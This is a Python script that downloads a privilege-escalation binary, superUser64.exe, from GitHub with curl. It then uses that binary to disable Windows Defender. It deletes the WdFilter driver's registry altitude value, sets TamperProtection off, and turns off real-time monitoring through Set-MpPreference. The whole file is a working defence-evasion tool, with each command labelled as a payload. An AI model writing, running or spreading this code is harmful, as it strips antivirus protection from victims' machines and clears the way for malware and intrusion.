import subprocess
import os
import sys

directory = os.listdir()
if "downloads" not in directory:
    os.mkdir("downloads")

downloads = os.listdir("downloads")
if "superUser64.exe" not in downloads:
    payload = "curl -L -H \"Accept: application/octet-stream\" github.com/mspaintmsi/superUser/releases/download/v6.0/superUser64.exe -o downloads\\superUser64.exe"
    print(payload)
    downloadfile = subprocess.run(payload, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
   



class defender(object):
    def __init__(self):
        self.superUserFile = r"downloads\superUser64 /ws powershell.exe"
        self.driverError = False
        self.tamperError = False
        self.realtimeError = False
        

    def disableProtectingDriver(self):
        
        payload1 = r"{} reg delete \"HKLM\System\CurrentControlSet\Services\WdFilter\Instances\WdFilter Instance\" /v Altitude /f".format(self.superUserFile)
        execute1 = subprocess.run(payload1, shell=True, capture_output=True)
        if execute1.stderr.__len__() > 0:
            self.driverError = True


    def disableTamperProtection(self):

        payload1 = r"{} reg add \"HKLM\SOFTWARE\Microsoft\Windows Defender\Features\" /v TamperProtection /t REG_DWORD /d 4 /f".format(self.superUserFile)
        execute1 = subprocess.run(payload1, shell=True, capture_output=True)
        if execute1.stderr.__len__() > 0:
            self.tamperError = True

    def disableRealTimeProtection(self):
        payload1 = r"{} Set-MpPreference -DisableRealTimeMonitoring $true".format(self.superUserFile)
        execute1 = subprocess.run(payload1, shell=True, capture_output=True)
        if execute1.stderr.__len__() > 0:
            self.realtimeError = True
if __name__ == "__main__":
    defndr = defender()
    defndr.disableProtectingDriver()
    defndr.disableTamperProtection()
    defndr.disableRealTimeProtection()
